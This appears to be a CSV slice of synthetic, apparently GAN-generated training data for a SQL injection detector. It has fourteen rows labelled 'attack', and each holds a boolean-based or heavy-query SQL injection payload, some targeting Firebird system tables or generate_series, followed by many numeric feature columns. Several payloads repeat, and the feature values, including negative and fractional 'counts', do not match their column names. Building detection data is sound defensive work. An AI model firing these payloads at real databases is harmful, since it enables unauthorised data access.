id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000434,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,6.261023240972629,103.63865661621094,64.87189483642578,12.099252700805664,39.462013244628906,-0.1228577271103859,53.19837188720703,13.400311470031738,0.6663607954978943,0.4337629973888397,0.04612870141863823,0.3052752614021301,0.15397526323795319,4.1260905265808105,1.168562412261963,0.545990526676178,0.27925723791122437,-0.02515365183353424,0.23234957456588745,0.06769692152738571,3.286447763442993,2.7423460483551025,1.8025791645050049,0.6756151914596558,1.9906363487243652,0.6829853653907776,0.814071536064148,0.3669680058956146,0.25201061367988586,0.9745321273803711,-0.03626265749335289,-0.30951637029647827,0.2984369993209839,0.7515086531639099,0.4943520128726959,1.753328561782837,1.33782160282135,1.0325578451156616,0.28524455428123474,0.43433552980422974,0.48193642497062683,0.41413766145706177,-0.019414886832237244,-0.717456579208374,0.13960102200508118,-0.3343181908130646,1.231972336769104,0.12532036006450653,0.2556972801685333,-0.26927024126052856,0.08486372977495193,-0.0890776589512825,-0.16015514731407166,0.9996255040168762,-0.5517227649688721,-0.6615056991577148,0.1912539154291153,0.8775103092193604,0.043097224086523056,0.016945719718933105,0.3267783522605896,-1.4243907928466797,0.5655502676963806,0.29250970482826233,0.3520488142967224,-0.265345960855484,0.6402658820152283,0.9872208833694458,-0.45538508892059326,0.32393598556518555,-0.4151745140552521,-0.1891244798898697,-0.29582563042640686,0.18285097181797028,0.025965586304664612,0.49214285612106323,1.1315374374389648,0.566623330116272,0.005051744170486927,-0.10980558395385742,0.5893926620483398,2.5134265422821045,0.4266713857650757,0.2346535623073578,-0.27847975492477417,-0.5979617238044739,0.7074365615844727,-0.7339795231819153,0.3396860361099243
GAN_000435,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,6.094863097445484,88.13606262207031,28.200389862060547,13.912943840026855,40.72087097167969,0.1418917030096054,15.40774154663086,14.299875259399414,0.7878126502037048,0.33201900124549866,0.10451200604438782,0.3548184931278229,0.18868060410022736,4.034212112426758,0.5941720008850098,-0.2159179449081421,1.137310266494751,0.03668396547436714,0.31283384561538696,0.03579745441675186,2.8624155521392822,3.3387885093688965,0.6992248296737671,0.5828367471694946,2.110212564468384,0.4328451454639435,1.1449061632156372,0.384177029132843,0.19509226083755493,0.3711684048175812,-0.009639469906687737,-0.40082502365112305,0.3060324192047119,0.08824536204338074,0.6260238289833069,1.8418906927108765,2.42816424369812,1.325730800628662,-0.045170944184064865,0.9005770683288574,0.2381669282913208,0.1337665170431137,0.10417964309453964,-0.37335655093193054,0.05694107711315155,-0.24708715081214905,1.0896075963974,0.06235465034842491,0.13308583199977875,-0.2055400013923645,-0.05288974568247795,-0.15192952752113342,0.06779906153678894,1.137337565422058,-0.8116102814674377,-1.0771424770355225,0.6827903389930725,0.24933186173439026,-0.9172297716140747,-0.2173466980457306,0.3717825412750244,-1.2207461595535278,0.9931221008300781,0.2630142867565155,-0.04321588575839996,-0.11661869287490845,0.8969887495040894,1.0377132892608643,-0.9791844487190247,0.3095865249633789,0.08911525458097458,-0.07978582382202148,-0.5004228949546814,0.10037259757518768,-0.08670766651630402,1.0641158819198608,1.1648186445236206,0.7898411154747009,-0.19086889922618866,0.03341732919216156,0.4465774595737457,1.9967631101608276,0.8384982943534851,0.5285760760307312,-0.5079998970031738,-0.9768442511558533,1.4169073104858398,-0.3342097997665405,-0.049841850996017456
GAN_000436,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000115,7.164806300536299,120.38688659667969,94.87519073486328,12.437891960144043,47.023277282714844,-0.32439857721328735,83.25882720947266,13.244830131530762,0.729483425617218,0.5514953136444092,-0.007052372209727764,0.25534188747406006,0.12297975271940231,4.275811672210693,1.8408042192459106,-0.46222102642059326,0.17185628414154053,-0.05096316337585449,0.3274698853492737,0.07433493435382843,3.662477493286133,3.5299582481384277,2.0296988487243652,0.6605510711669922,2.0034215450286865,1.0760748386383057,0.7696168422698975,0.8440147042274475,0.26930946111679077,1.429713487625122,-0.02331642434000969,-0.6170120239257812,0.2905694544315338,1.5262459516525269,0.5524865388870239,1.3684107065200806,1.3852288722991943,0.7918047904968262,0.4177323877811432,0.46595752239227295,0.5688613653182983,0.7716993093490601,0.11674124002456665,-0.5896544456481934,0.5570899844169617,0.32460930943489075,0.6180689930915833,0.21488775312900543,0.27177271246910095,-0.2028142511844635,0.21310612559318542,0.056720070540905,0.09265302121639252,1.139861822128296,-0.49063771963119507,-0.727574348449707,0.33122390508651733,0.8184898495674133,0.683447003364563,0.022223234176635742,0.32506197690963745,-1.4572844505310059,0.9722800254821777,0.25658535957336426,0.44695019721984863,-0.6036700010299683,0.6329313516616821,1.274303674697876,-0.3180515468120575,0.630953311920166,-0.35938066244125366,0.02120884321630001,-0.09523290395736694,0.2462969720363617,0.1230950653553009,0.3005830645561218,1.400740623474121,0.1413891762495041,0.06854639202356339,-0.26431822776794434,0.8235607743263245,3.816917896270752,0.05660998821258545,0.7125269174575806,-0.43675896525382996,-0.8750199675559998,1.159593939781189,0.003068111836910248,0.8370583653450012
GAN_000437,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,6.562502821243807,104.52523040771484,43.88581466674805,13.348827362060547,41.91266632080078,-0.16876843571662903,32.48308181762695,11.811110496520996,0.5971300601959229,0.4080424904823303,0.03795691207051277,0.2937294840812683,0.1557481586933136,4.090975761413574,1.7054469585418701,0.5603217482566833,0.2623669505119324,0.004960675723850727,0.36829420924186707,0.0311911478638649,3.121913194656372,3.137319803237915,1.3903738260269165,0.765658974647522,2.089005470275879,0.5303910970687866,0.9931925535202026,0.395230233669281,0.3793313801288605,0.929904043674469,-0.04470522329211235,-0.5328925251960754,0.32926908135414124,0.5673016905784607,0.6615108251571655,1.8942805528640747,1.9495024681091309,0.8856574296951294,0.2965036630630493,0.7539582848548889,0.2976645529270172,0.21594901382923126,0.1459863930940628,-0.6836495399475098,0.14424724876880646,0.0015770979225635529,0.9071779847145081,0.07942084968090057,0.245563805103302,-0.1810646951198578,0.05487758293747902,-0.061049919575452805,0.12144064903259277,0.9963327050209045,-0.7430112361907959,-0.7738685607910156,0.37638553977012634,0.2313278466463089,0.04821358248591423,-0.2846328020095825,-0.021762125194072723,-0.7128142714500427,0.8131037950515747,0.2805466055870056,0.2779504060745239,-0.16602559387683868,0.5363184809684753,0.9041255712509155,-0.8338118195533752,0.3533940017223358,-0.357610285282135,-0.06768926978111267,-0.3898492753505707,0.15865059196949005,0.187429279088974,0.31261980533599854,1.2011321783065796,0.4337465763092041,0.13874517381191254,-0.10436564683914185,0.8613578677177429,2.90238618850708,0.5091869831085205,0.5175574421882629,-0.6057083606719971,-0.5678865313529968,0.7312701940536499,-0.3298066258430481,0.7033920288085938
GAN_000438,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000064,5.678746678703509,120.44559478759766,58.21872329711914,13.06447982788086,44.878177642822266,0.19508156180381775,45.5427360534668,15.650667190551758,0.6675307750701904,0.44056829810142517,0.06917821615934372,0.3084333539009094,0.15542615950107574,4.012115955352783,0.9225424528121948,-0.06710278987884521,0.9329709410667419,0.009195479564368725,0.22087690234184265,0.03577251732349396,3.1485097408294678,4.2168121337890625,1.0138049125671387,0.5434085726737976,1.981900930404663,0.6901243925094604,0.6715265512466431,0.8970447182655334,0.12198473513126373,0.7221601605415344,0.007576521951705217,-0.5364184975624084,0.1978793740272522,0.4463907480239868,0.6053118109703064,1.7157373428344727,2.6331748962402344,0.501986563205719,0.26838114857673645,0.6908491253852844,0.41430240869522095,0.3472023010253906,0.41864559054374695,-0.49318209290504456,0.1649206429719925,-0.10718157887458801,0.33207711577415466,0.23314684629440308,0.21997201442718506,-0.1105065867304802,0.04673091322183609,0.05748957768082619,0.10400356352329254,0.7546711564064026,-0.34603747725486755,-0.7394852638244629,0.3659031093120575,0.5270573496818542,0.006181851029396057,-0.21404513716697693,0.4319268465042114,-0.7051892876625061,0.8493529558181763,0.12172316014766693,-0.027660541236400604,-0.48308974504470825,0.5596970915794373,0.6199108362197876,-0.6150832176208496,0.34971898794174194,-0.14989203214645386,0.2052358090877533,-0.46193552017211914,0.11660168319940567,0.016469858586788177,0.5691823363304138,0.9499722719192505,0.35702192783355713,-0.2769390046596527,0.08096373081207275,0.5143702030181885,2.835339307785034,0.36621594429016113,0.7038408517837524,-0.5766808390617371,-0.729682207107544,0.9590334892272949,0.04464989900588989,0.16358384490013123
GAN_000439,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,7.3756847308172615,103.40057373046875,29.00608253479004,15.591809272766113,51.272945404052734,0.3566150963306427,6.91840934753418,14.82506275177002,1.0457465648651123,0.326457142829895,0.06394980102777481,0.2991001307964325,0.18398839235305786,4.1165242195129395,0.7430309057235718,-0.28351521492004395,0.6222427487373352,0.044653747230768204,0.368310809135437,0.009676150977611542,3.3209726810455322,4.146207809448242,0.08014491945505142,0.8314000964164734,2.1273021697998047,0.6908226013183594,1.445459246635437,0.689690887928009,0.2512281835079193,0.5853707790374756,-0.00019936086027882993,-0.5350180268287659,0.28673967719078064,0.721507728099823,0.6213620901107788,1.963965654373169,2.7252235412597656,1.071108341217041,-0.06176648661494255,1.103717565536499,0.3048273026943207,-0.04058699309825897,0.5224177241325378,-0.5405764579772949,0.4600295424461365,-0.2721789479255676,0.5310975909233093,0.18605251610279083,0.16301283240318298,-0.22696012258529663,-0.004283288959413767,-0.03800935670733452,0.028280500322580338,1.1405291557312012,-1.0939778089523315,-1.6500016450881958,0.9264746308326721,0.09946981072425842,-0.4891808331012726,-0.5876874923706055,0.4265591502189636,-1.1192305088043213,1.012632966041565,0.3521887958049774,0.18203961849212646,-0.20884616672992706,0.6729263663291931,0.691153883934021,-1.3940852880477905,0.5806742906570435,0.12310681492090225,0.33319729566574097,-0.7759286761283875,0.16816496849060059,0.10943594574928284,0.8030012249946594,1.238970160484314,0.7600383758544922,-0.36966246366500854,0.030718371272087097,0.7807963490486145,2.0157265663146973,0.7157424688339233,1.0031383037567139,-0.8613390326499939,-1.320988416671753,1.6876431703567505,-0.4451717138290405,0.3012112081050873
GAN_000440,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,4.69983178211147,101.11773681640625,24.53468132019043,16.24616050720215,48.945518493652344,0.22967055439949036,12.122167587280273,15.914427757263184,1.0470373630523682,0.3152010440826416,0.12210175395011902,0.3590814173221588,0.1729099303483963,3.8184142112731934,1.2824915647506714,-0.011770310811698437,1.0031723976135254,0.04192482307553291,0.23269537091255188,-0.0013339814031496644,3.0038514137268066,4.170648574829102,0.5225584506988525,0.563060998916626,1.926089882850647,0.2588863670825958,0.7226225137710571,0.6015830636024475,0.16085495054721832,0.39251482486724854,0.010147796012461185,-0.1323574185371399,0.19102585315704346,0.13341955840587616,0.6080140471458435,1.8479143381118774,2.509498119354248,1.0849181413650513,0.1882716864347458,0.6379295587539673,0.32609525322914124,0.0837378054857254,0.25441598892211914,-0.2623847424983978,0.14980864524841309,-0.20444391667842865,0.2935270071029663,0.10280842334032059,0.1553696095943451,-0.0672268345952034,0.053996745496988297,-0.027760403230786324,-0.10994021594524384,0.6030243635177612,-0.7209675312042236,-0.769963264465332,0.4986318349838257,0.23119013011455536,-0.4410347044467926,-0.38743963837623596,0.2943163514137268,-0.4039367437362671,0.5529731512069702,0.18778881430625916,0.01837141439318657,-0.2166941910982132,0.31220030784606934,0.3537275195121765,-0.7321003675460815,0.27898097038269043,0.05530277639627457,0.17222268879413605,-0.25189101696014404,0.054956283420324326,0.11197230219841003,0.7312507033348083,1.0121753215789795,0.6458949446678162,-0.24999777972698212,0.240863636136055,0.507591724395752,3.0801029205322266,0.9804500341415405,0.5031923651695251,-0.4947085380554199,-0.6230509877204895,0.8816444277763367,-0.315655916929245,0.06848454475402832
GAN_000441,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,6.552306135568942,120.50695037841797,73.32439422607422,13.629508018493652,47.95005798339844,-0.08274700492620468,55.76959228515625,13.06739616394043,0.8484649062156677,0.4636954069137573,0.005464543588459492,0.2786889672279358,0.13019758462905884,4.267668724060059,1.678981065750122,-0.0716252326965332,0.3363000154495239,0.004222025163471699,0.3490763306617737,0.043654248118400574,3.437061071395874,3.6337063312530518,1.50216543674469,0.5913953185081482,1.983888864517212,0.8435218930244446,1.14725661277771,0.5696089267730713,0.3220522999763489,1.3189167976379395,-0.014190856367349625,-0.7139929533004761,0.2799886465072632,1.1909815073013306,0.6183044910430908,1.554388165473938,1.6097999811172485,0.6543623805046082,0.40076571702957153,0.7575970888137817,0.34459128975868225,0.41331052780151367,0.3497334122657776,-0.6913204193115234,0.6500154733657837,0.26201701164245605,0.4765060842037201,0.17572952806949615,0.20348133146762848,-0.11588243395090103,0.0388992540538311,0.02174067310988903,0.16829615831375122,1.1362396478652954,-0.6917644143104553,-1.0120294094085693,0.6491228938102722,0.33748137950897217,0.46278172731399536,-0.4889385998249054,0.021702848374843597,-1.188037395477295,1.0551183223724365,0.2782187759876251,0.425285279750824,-0.47900840640068054,0.5635974407196045,0.9547767639160156,-0.5469479560852051,0.4748498797416687,-0.2657080590724945,0.2260805368423462,-0.3527399003505707,0.20305514335632324,0.23949845135211945,0.40675538778305054,1.2700926065444946,0.34281498193740845,0.10575929284095764,-0.293862521648407,0.5634716749191284,3.1570918560028076,0.5361799001693726,1.0072945356369019,-0.5232836008071899,-0.939319372177124,1.2531787157058716,0.08919838070869446,0.6071069240570068
GAN_000442,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000064,5.563698389379465,105.81458282470703,54.314029693603516,13.141119003295898,42.18580627441406,-0.0933065339922905,44.470359802246094,14.193951606750488,0.6994505524635315,0.4368354380130768,0.08764711767435074,0.3196323812007904,0.15711286664009094,4.0504865646362305,1.4205878973007202,0.35741275548934937,0.7050001621246338,0.0006998375174589455,0.2756948173046112,0.03839391469955444,3.200375556945801,3.3668107986450195,1.6306308507919312,0.5662266612052917,1.9694833755493164,0.46737608313560486,0.6392068862915039,0.5382607579231262,0.20194053649902344,0.6681931614875793,-0.027162935584783554,-0.38168424367904663,0.23434409499168396,0.3732890784740448,0.6020997762680054,1.647120475769043,2.3554561138153076,1.110904335975647,0.3248065114021301,0.458702027797699,0.39171165227890015,0.40132319927215576,0.16200795769691467,-0.5022280216217041,-0.04891623929142952,-0.1053907498717308,0.7212498784065247,0.11950506269931793,0.2247488647699356,-0.135716050863266,0.10193184018135071,0.021423226222395897,0.014725897461175919,0.6874807476997375,-0.5193028450012207,-0.5137786865234375,0.3321174681186676,0.3489975333213806,-0.12213161587715149,0.08008904755115509,0.12304820120334625,-0.835479199886322,0.7151375412940979,0.20063592493534088,0.07311584800481796,-0.1431269496679306,0.6377391815185547,0.9128539562225342,-0.37353837490081787,0.13958190381526947,-0.27133235335350037,-0.02338055893778801,-0.14591598510742188,0.13229826092720032,-0.021701663732528687,0.42995452880859375,1.0777623653411865,0.4476794898509979,-0.11920192837715149,0.06489969789981842,0.4658988118171692,3.1548521518707275,0.6957331895828247,0.3936900496482849,-0.5349679589271545,-0.5609472990036011,0.6871849894523621,-0.1650707721710205,0.35567569732666016
GAN_000443,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,5.482717059230575,114.2679214477539,61.10757064819336,12.710113525390625,42.9926643371582,-0.13417991995811462,53.5737190246582,13.959297180175781,0.8012039065361023,0.4704931974411011,0.0464007668197155,0.28108125925064087,0.14638617634773254,4.244287490844727,1.5558840036392212,0.21490108966827393,0.02854972705245018,-0.00565421674400568,0.20187592506408691,0.046178821474313736,3.3790817260742188,2.7947335243225098,1.4678045511245728,0.2787238657474518,1.9248234033584595,0.6330096125602722,0.8061726093292236,0.3754133880138397,0.29739415645599365,1.0073472261428833,-0.002888644579797983,-0.22011114656925201,0.25917869806289673,0.8177061676979065,0.471463143825531,1.5748831033706665,1.0408719778060913,0.8507880568504333,0.3916156589984894,0.49905693531036377,0.5211639404296875,0.5133406519889832,-0.04639030620455742,-0.5057042837142944,0.35872384905815125,0.00012682564556598663,0.7315358519554138,0.11669554561376572,0.16192509233951569,-0.0857003703713417,0.10102198272943497,-0.03955252096056938,-0.06355274468660355,0.9223681092262268,-0.47935229539871216,-0.5026638507843018,0.4164881408214569,0.379584401845932,0.3142023980617523,-0.14441025257110596,0.12636788189411163,-0.8242859840393066,0.6269559860229492,0.2442031353712082,0.41929882764816284,-0.4786413908004761,0.40118780732154846,1.0712205171585083,-0.37067943811416626,0.27641165256500244,-0.34605059027671814,-0.04878891259431839,-0.2372118979692459,0.15503919124603271,0.042885519564151764,0.4307501018047333,1.149687647819519,0.47737622261047363,-0.018580351024866104,-0.15858545899391174,0.5753111839294434,3.472249746322632,0.8521018624305725,0.47109049558639526,-0.15565738081932068,-0.5486825704574585,1.0299136638641357,-0.2865162491798401,0.5359364748001099
GAN_000444,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,8.150983697402054,97.36274719238281,58.223026275634766,10.854411125183105,40.070152282714844,0.025436904281377792,50.23931884765625,11.154792785644531,0.5808101892471313,0.4697672426700592,0.01686754636466503,0.2776840031147003,0.15766839683055878,4.218756198883057,1.2725021839141846,0.12566065788269043,0.08512967079877853,0.0030678126495331526,0.3450098931789398,0.08156686276197433,3.2367091178894043,2.4821712970733643,1.6240090131759644,0.9415873289108276,2.175164222717285,0.8008850812911987,1.3951098918914795,0.5489112734794617,0.4029557704925537,1.1072660684585571,-0.04288366064429283,-0.5546828508377075,0.4469671845436096,0.9987829327583313,0.552182137966156,1.6904951333999634,1.241288661956787,1.2237557172775269,0.16368915140628815,1.0818623304367065,0.4111066460609436,0.33917608857154846,0.09733904153108597,-0.9324365854263306,-0.028704600408673286,-0.17237035930156708,1.4247463941574097,0.10168606042861938,0.3078780174255371,-0.35284820199012756,0.05675950273871422,-0.1322370171546936,-0.1505882740020752,1.1288633346557617,-1.3943521976470947,-1.0344873666763306,0.663362979888916,0.684913158416748,-0.2317323386669159,0.11646180599927902,0.3168240785598755,-1.7209819555282593,1.131271243095398,0.4092850089073181,0.20241989195346832,-0.36535781621932983,0.908872663974762,1.7756785154342651,-0.6505476832389832,0.47635847330093384,-0.4219689965248108,0.08800451457500458,-0.2634733021259308,0.2621650993824005,0.12195005267858505,0.5437528491020203,1.070980191230774,0.6390810608863831,-0.0025114654563367367,-0.2310868799686432,1.1719167232513428,2.747575044631958,0.46150755882263184,0.6076411604881287,-0.6288737654685974,-0.8270748853683472,1.1813582181930542,-0.7552799582481384,0.5434765219688416
GAN_000445,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000036,7.279963579828753,120.08074951171875,88.5980453491211,12.516740798950195,40.692047119140625,-0.3877752125263214,73.87483978271484,11.283864974975586,0.6695597171783447,0.5520776510238647,-0.02128986455500126,0.23295842111110687,0.1192266121506691,4.476254940032959,2.1577696800231934,0.4183695316314697,-0.45749765634536743,-0.06066284328699112,0.27813345193862915,0.08576325327157974,3.517104387283325,2.768317222595215,2.3312408924102783,0.6460540890693665,1.9100263118743896,1.2237526178359985,0.8840937614440918,0.5035519599914551,0.478852778673172,1.4437029361724854,-0.05749301612377167,-0.5303850173950195,0.33118224143981934,1.44622802734375,0.47885197401046753,1.653213381767273,0.8785584568977356,0.9208569526672363,0.48251423239707947,0.5981943607330322,0.5897340178489685,0.566159188747406,0.008632443845272064,-0.989166259765625,0.34364208579063416,0.170259028673172,1.3339265584945679,0.11922865360975266,0.24115528166294098,-0.2876978814601898,0.08031104505062103,-0.026393139734864235,-0.24630233645439148,0.9182213544845581,-0.8609279990196228,-0.5571284294128418,0.4463972747325897,0.7227540016174316,0.7699335813522339,0.1853179931640625,-0.10432550311088562,-1.5272972583770752,0.9022108316421509,0.33703869581222534,0.40441322326660156,-0.5113327503204346,0.6762047410011292,1.263878345489502,-0.457447350025177,0.39701518416404724,-0.4215417504310608,-0.1554805338382721,-0.12273423373699188,0.26498323678970337,0.19475045800209045,0.18641285598278046,1.255418062210083,0.29035240411758423,0.21745911240577698,-0.41304755210876465,0.8255642652511597,3.4063212871551514,0.22236037254333496,0.5577097535133362,-0.365796834230423,-0.6228256821632385,0.7785801887512207,-0.4977196156978607,1.2785391807556152
GAN_000446,attack,boolean,"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",nearest_attack_euclidean,R000088,6.6860013282031785,96.30194854736328,31.295513153076172,15.201350212097168,50.14768600463867,0.3397808372974396,13.787454605102539,14.184165000915527,0.706582248210907,0.32244595885276794,0.07579801976680756,0.3660624921321869,0.17591309547424316,3.996837854385376,0.8625786900520325,0.08498120307922363,0.9307134747505188,0.04158492758870125,0.3225651979446411,0.033537525683641434,3.5009424686431885,4.104610919952393,0.3078959286212921,0.6651068925857544,2.1336569786071777,0.50743168592453,1.2305396795272827,0.6705090403556824,0.20418865978717804,0.5472184419631958,0.0005454071215353906,-0.6620191931724548,0.2931988537311554,0.47999659180641174,0.7025203704833984,1.8405885696411133,2.3423826694488525,1.1141661405563354,-0.02088163234293461,1.0532845258712769,0.26318415999412537,-0.007426605559885502,0.4011448919773102,-0.522936224937439,0.40247032046318054,-0.22025062143802643,0.6882023811340332,0.08978818356990814,0.17609384655952454,-0.21220973134040833,0.0025755518581718206,-0.10991699248552322,-0.0368180088698864,1.0825220346450806,-1.020453691482544,-1.103501319885254,0.8514164090156555,0.41872459650039673,-0.8303247690200806,-0.7570754885673523,0.5242207646369934,-1.2412941455841064,1.0076186656951904,0.3398505449295044,0.2502491772174835,-0.26966720819473267,0.820344090461731,0.5703409314155579,-0.8715634346008301,0.5149798393249512,-0.037927862256765366,0.24990612268447876,-0.3411843180656433,0.1322735846042633,0.0725758969783783,0.9546542167663574,1.2370049953460693,0.6522324085235596,-0.2539224624633789,-0.02486640214920044,0.8729383945465088,2.8647868633270264,0.6606500148773193,1.0020174980163574,-0.580761194229126,-1.1792534589767456,1.4765281677246094,-0.19208818674087524,0.17828556895256042
GAN_000447,attack,boolean,"1  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  3814  =  3814",nearest_attack_euclidean,R000048,7.499993514160018,118.49295806884766,68.5757827758789,11.481218338012695,43.863555908203125,-0.03379838913679123,57.77251434326172,13.977681159973145,0.6889495849609375,0.46263858675956726,0.019260136410593987,0.2493443489074707,0.15027594566345215,4.37769079208374,1.0382211208343506,-0.25816380977630615,0.21571725606918335,0.00789822731167078,0.37444549798965454,0.07403538376092911,3.2257423400878906,3.196265459060669,1.1376596689224243,0.5671201944351196,2.019111156463623,1.06906259059906,1.3001270294189453,0.7126195430755615,0.27680814266204834,1.0934921503067017,-0.007341988850384951,-0.6507568955421448,0.3279516398906708,1.2636148929595947,0.6001068949699402,1.5596715211868286,1.763443112373352,0.7138708233833313,0.0887020155787468,1.1497554779052734,0.3473648428916931,0.5551934242248535,0.420301228761673,-0.5964866876602173,0.08542819321155548,0.15669724345207214,0.664227306842804,0.24231059849262238,0.14697018265724182,-0.23615700006484985,0.042150888592004776,-0.03429592028260231,0.21776261925697327,1.011492133140564,-1.0178020000457764,-1.1293184757232666,0.8857119083404541,0.6286075115203857,-0.18978285789489746,-0.14965495467185974,0.5121460556983948,-1.5003052949905396,1.1770908832550049,0.28559523820877075,0.1934763789176941,-0.6699768900871277,0.8182238340377808,1.3467037677764893,-0.8534411191940308,0.5653858780860901,-0.28405654430389404,0.1766427606344223,-0.5069562792778015,0.26311635971069336,-0.08254201710224152,0.5770376324653625,1.1583462953567505,0.502393364906311,-0.1638260930776596,-0.22452384233474731,0.8202664852142334,2.6307382583618164,0.5035197734832764,0.8861976265907288,-0.9130781888961792,-0.9472046494483948,1.6989184617996216,-0.19299490749835968,0.6730504631996155
